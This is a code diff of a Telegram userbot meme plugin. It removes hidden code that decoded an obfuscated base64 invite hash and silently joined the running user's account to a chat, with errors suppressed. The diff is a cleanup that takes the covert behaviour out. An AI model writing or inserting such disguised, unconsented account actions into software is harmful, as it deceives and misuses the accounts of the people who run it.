@@ -164,7 +164,6 @@ async def memes(cat):
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
     cat = await cat.edit("`Downloading media......`")
-    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
     catsticker = await reply.download_media(file="./temp/")
@@ -173,7 +172,6 @@ async def memes(cat):
         os.remove(catsticker)
         await cat.edit("```Supported Media not found...```")
         return
-    import pybase64
 
     if catsticker.endswith(".tgs"):
         await cat.edit(
@@ -213,12 +211,6 @@ async def memes(cat):
             "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
         )
         meme_file = catsticker
-    try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        san = Get(san)
-        await cat.client(san)
-    except BaseException:
-        pass
     meme_file = convert_toimage(meme_file)
     if cmd == "mmf":
         meme = "catmeme.jpg"
